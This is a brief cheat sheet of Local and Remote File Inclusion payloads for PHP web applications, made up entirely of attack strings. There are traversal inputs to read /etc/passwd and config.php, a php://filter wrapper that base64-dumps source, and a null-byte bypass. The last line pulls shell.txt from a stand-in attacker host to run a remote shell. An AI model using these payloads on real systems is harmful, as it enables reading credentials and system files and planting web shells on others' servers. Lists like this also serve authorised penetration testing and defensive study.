# Local & Remote File Inclusion

## LFI Test Payloads
?page=../../../../etc/passwd
?page=....//....//....//etc/passwd
?page=/var/www/html/config.php

## PHP Wrappers
?page=php://filter/convert.base64-encode/resource=config.php

## Null Byte (older PHP)
?page=../../../../etc/passwd%00

## RFI (if allow_url_include=On)
?page=http://<ATTACKER_IP>/shell.txt
